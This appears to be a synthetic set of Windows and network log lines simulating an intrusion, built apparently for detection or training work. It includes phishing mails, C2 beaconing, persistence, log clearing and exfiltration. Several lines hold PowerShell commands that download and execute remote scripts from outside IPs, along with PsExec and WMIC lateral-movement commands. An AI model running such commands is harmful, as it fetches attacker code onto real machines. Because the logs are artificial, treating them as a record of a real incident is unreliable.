+2024-12-20 18:00:00 10.0.0.55[Azure]: Upload: Container=company-backup, Files=5000+, Size=500MB, Destination=https://company-backup.s3.amazonaws.com/backup
+2024-12-21 08:00:00 10.0.0.55[Security]: EventID=4688 New process created with elevated token: Parent: cmd.exe, Child: powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://103.35.74.12/payload.ps1'))"
+2024-12-20 16:00:00 192.168.1.100[Security]: EventID=4673 A privileged service was called: Subject: Security ID=S-1-5-21-xxx-500, Process Name=C:\Windows\System32\Updater.exe
+2024-12-20 12:00:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Attachment: resume_4.pdf.exe, Attachment: malicious_4.exe
+2024-12-20 22:00:00 192.168.1.200[DNS]: Query:很长的主机名模式.subdomain.apt-c2.com -> 185.220.101.46
+2024-12-21 10:00:00 192.168.1.200[Azure]: Upload: Container=company-backup, Files=5000+, Size=500MB, Destination=https://company-backup.s3.amazonaws.com/backup
+2024-12-20 17:00:00 WIN-SQL-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-20 16:00:00 WIN-DC-01[Security]: EventID=4662 An operation was performed on an object: ObjectType=User, Operation=GetChanges, CallerPS=DC01$
+2024-12-21 00:00:00 192.168.1.50[Security]: EventID=4688 New process created with elevated token: Parent: cmd.exe, Child: powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://185.220.101.46/payload.ps1'))"
+2024-12-20 18:00:00 WIN-APP-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-20 19:45:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 21:00:00 WIN-WEB-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-21 22:00:00 172.16.0.100[Firewall]: OUTBOUND ICMP Type=8 Code=0 from 192.168.1.50 to 185.220.101.46 (Payload size: 1400 bytes, repeated 5000+ times)
+2024-12-21 03:15:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 14:20:00 WIN-APP-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 18:00:00 WIN-SQL-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 11:00:00 WIN-WEB-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-20 22:00:00 192.168.1.50[Security]: EventID=4688 New process created with elevated token: Parent: cmd.exe, Child: powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://23.129.64.213/payload.ps1'))"
+2024-12-20 11:00:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Attachment: resume_2.pdf.exe, Attachment: malicious_2.exe
+2024-12-20 13:45:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 17:50:00 WIN-SQL-01[Network]: CONNECT http://91.121.87.18:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-21 12:00:00 192.168.1.200[Security]: EventID=4688 New process created with elevated token: Parent: cmd.exe, Child: powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://23.129.64.213/payload.ps1'))"
+2024-12-20 13:00:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 12:15:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 19:00:00 WIN-DC-01[Security]: EventID=4662 An operation was performed on an object: ObjectType=User, Operation=GetChanges, CallerPS=DC01$
+2024-12-20 16:00:00 WIN-WEB-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-20 20:00:00 10.0.0.55[Security]: EventID=4688 Process Create: CommandLine=wmic /node:172.16.0.100 process call create "powershell.exe -c ..."
+2024-12-20 12:10:00 WIN-SQL-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 19:45:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 16:30:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Subject: Quarterly Report - Q4 2024, Attachment: malicious_13.exe
+2024-12-20 13:30:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Subject: Invoice #7 - Payment Required, Attachment: malicious_7.exe
+2024-12-20 22:00:00 WIN-DC-01[Security]: EventID=4688 New process created: CommandLine="C:\Windows\System32\lsass.exe" (but actually procspawn)
+2024-12-20 13:10:00 WIN-WEB-01[Network]: CONNECT http://23.129.64.213:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-21 04:00:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 10:00:00 WIN-SQL-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-20 10:40:00 WIN-APP-01[Network]: CONNECT http://45.154.255.147:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 10:30:00 WIN-SQL-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-21 13:00:00 WIN-DC-01[Security]: EventID=4674 SeDebugPrivilege assigned to user: Administrator
+2024-12-20 16:30:00 WIN-APP-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 13:40:00 WIN-WEB-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-21 05:00:00 WIN-WEB-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-20 11:40:00 WIN-APP-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-21 14:00:00 192.168.1.200[DNS]: Query:很长的主机名模式.subdomain.apt-c2.com -> 185.220.101.46
+2024-12-21 01:00:00 WIN-SQL-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-20 12:20:00 WIN-WEB-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 16:40:00 WIN-APP-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 15:00:00 172.16.0.100[Security]: EventID=4688 PsExec.exe -s -d \172.16.0.100 cmd.exe
+2024-12-21 13:00:00 WIN-DC-01[Security]: EventID=4688 New process created: CommandLine="C:\Windows\System32\lsass.exe" (but actually procspawn)
+2024-12-20 17:00:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Attachment: report_14.xls.exe, Attachment: malicious_14.exe
+2024-12-20 11:00:00 WIN-APP-01[Network]: CONNECT http://185.220.101.46:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-21 13:00:00 WIN-DC-01[Security]: EventID=4662 An operation was performed on an object: ObjectType=User, Operation=GetChanges, CallerPS=DC01$
+2024-12-20 17:30:00 WIN-APP-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 20:00:00 172.16.0.100[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=10.0.0.55, AccountName=Administrator
+2024-12-20 17:30:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Attachment: resume_15.pdf.exe, Attachment: malicious_15.exe
+2024-12-21 22:00:00 172.16.0.100[Azure]: Upload: Container=company-backup, Files=5000+, Size=500MB, Destination=https://company-backup.s3.amazonaws.com/backup
+2024-12-20 15:00:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_10.exe"
+2024-12-20 10:00:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 10:00:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Subject: Quarterly Report - Q4 2024, Attachment: malicious_0.exe
+2024-12-21 16:00:00 WIN-DC-01[Security]: EventID=4688 New process created: CommandLine="C:\Windows\System32\lsass.exe" (but actually procspawn)
+2024-12-20 14:40:00 WIN-WEB-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 20:30:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-21 05:00:00 WIN-WEB-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-20 12:15:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 23:00:00 WIN-SQL-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-21 03:15:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-20 15:40:00 WIN-WEB-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 12:40:00 WIN-APP-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 14:10:00 WIN-WEB-01[Network]: CONNECT http://91.121.87.18:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 22:00:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-20 15:00:00 172.16.0.100[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=172.16.0.100, AccountName=Administrator
+2024-12-20 12:30:00 WIN-WEB-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 21:15:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-20 11:10:00 WIN-WEB-01[Network]: CONNECT http://103.35.74.12:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 13:00:00 WIN-DC-01[Security]: EventID=4649 A replay attack was detected - potential pass-the-hash
+2024-12-20 11:20:00 WIN-WEB-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 12:30:00 WIN-WEB-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-21 16:00:00 WIN-DC-01[Security]: EventID=4674 SeDebugPrivilege assigned to user: Administrator
+2024-12-20 10:00:00 WIN-SQL-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-20 13:30:00 WIN-SQL-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 18:00:00 WIN-SQL-01[Network]: CONNECT http://91.121.87.18:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 18:00:00 192.168.1.200[Security]: EventID=4688 New process created with elevated token: Parent: cmd.exe, Child: powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://23.129.64.213/payload.ps1'))"
+2024-12-20 16:00:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-20 13:00:00 WIN-WEB-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-21 00:15:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 19:00:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 16:10:00 WIN-WEB-01[Network]: CONNECT http://23.129.64.213:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 10:00:00 10.0.0.55[DNS]: Query:很长的主机名模式.subdomain.apt-c2.com -> 185.220.101.46
+2024-12-20 13:00:00 WIN-WEB-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 12:00:00 WIN-WEB-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-20 17:00:00 WIN-APP-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 13:00:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-20 14:30:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Subject: Invoice #9 - Payment Required, Attachment: malicious_9.exe
+2024-12-21 04:00:00 WIN-WEB-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-20 18:00:00 172.16.0.100[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=10.0.0.55, AccountName=Administrator
+2024-12-20 11:00:00 WIN-WEB-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-21 10:00:00 WIN-DC-01[Security]: EventID=4688 New process created: CommandLine="C:\Windows\System32\lsass.exe" (but actually procspawn)
+2024-12-20 11:20:00 WIN-WEB-01[Network]: CONNECT http://91.121.87.18:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-21 02:00:00 192.168.1.200[DNS]: Query:很长的主机名模式.subdomain.apt-c2.com -> 185.220.101.46
+2024-12-20 18:10:00 WIN-APP-01[Network]: CONNECT http://103.35.74.12:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 10:00:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 12:00:00 WIN-SQL-01[Network]: CONNECT http://185.220.101.46:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-21 00:00:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Attachment: report_28.xls.exe, Attachment: malicious_28.exe
+2024-12-20 13:10:00 WIN-WEB-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 12:15:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 23:00:00 WIN-SQL-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-20 15:50:00 WIN-SQL-01[Network]: CONNECT http://45.154.255.147:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 11:30:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Subject: Resume - 3 Application, Attachment: malicious_3.exe
+2024-12-20 10:20:00 WIN-SQL-01[Network]: CONNECT http://45.154.255.147:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 18:00:00 10.0.0.55[Firewall]: OUTBOUND ICMP Type=8 Code=0 from 192.168.1.50 to 185.220.101.46 (Payload size: 1400 bytes, repeated 5000+ times)
+2024-12-21 10:00:00 192.168.1.200[Firewall]: OUTBOUND BLOCK TCP 192.168.1.100:52345 -> 185.220.101.46:443 (Data: 2.5GB)
+2024-12-20 13:50:00 WIN-APP-01[Network]: CONNECT http://91.121.87.18:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 23:30:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 10:45:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 20:00:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_20.exe"
+2024-12-20 10:00:00 10.0.0.55[Security]: EventID=4688 New process created with elevated token: Parent: cmd.exe, Child: powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://45.154.255.147/payload.ps1'))"
+2024-12-20 21:15:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 21:30:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_23.exe"
+2024-12-20 17:10:00 WIN-WEB-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-21 02:00:00 192.168.1.200[Security]: EventID=4688 PsExec.exe -s -d \172.16.0.100 cmd.exe
+2024-12-20 23:30:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Attachment: report_27.xls.exe, Attachment: malicious_27.exe
+2024-12-20 12:00:00 192.168.1.50[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=192.168.1.50, AccountName=Administrator
+2024-12-20 11:00:00 192.168.1.200[Security]: EventID=4688 Process Create: CommandLine=wmic /node:192.168.1.200 process call create "powershell.exe -c ..."
+2024-12-20 10:45:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-20 14:00:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_8.exe"
+2024-12-20 17:00:00 WIN-SQL-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-20 10:30:00 WIN-SQL-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 12:40:00 WIN-APP-01[Network]: CONNECT http://91.121.87.18:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 20:00:00 10.0.0.55[Security]: EventID=4688 PsExec.exe -s -d \172.16.0.100 cmd.exe
+2024-12-21 12:00:00 192.168.1.200[Security]: EventID=4673 A privileged service was called: Subject: Security ID=S-1-5-21-xxx-500, Process Name=C:\Windows\System32\Updater.exe
+2024-12-20 22:00:00 192.168.1.200[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=172.16.0.100, AccountName=Administrator
+2024-12-20 17:30:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 18:00:00 WIN-APP-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-20 19:00:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 16:00:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Attachment: report_12.xls.exe, Attachment: malicious_12.exe
+2024-12-20 13:00:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Attachment: resume_6.pdf.exe, Attachment: malicious_6.exe
+2024-12-21 10:00:00 WIN-DC-01[Security]: EventID=4674 SeDebugPrivilege assigned to user: Administrator
+2024-12-20 11:40:00 WIN-APP-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 19:00:00 WIN-DC-01[Security]: EventID=4674 SeDebugPrivilege assigned to user: Administrator
+2024-12-20 12:00:00 192.168.1.50[Security]: EventID=4688 New process created with elevated token: Parent: cmd.exe, Child: powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://45.154.255.147/payload.ps1'))"
+2024-12-20 15:15:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 16:10:00 WIN-WEB-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 10:50:00 WIN-WEB-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 20:30:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Subject: Quarterly Report - Q4 2024, Attachment: malicious_21.exe
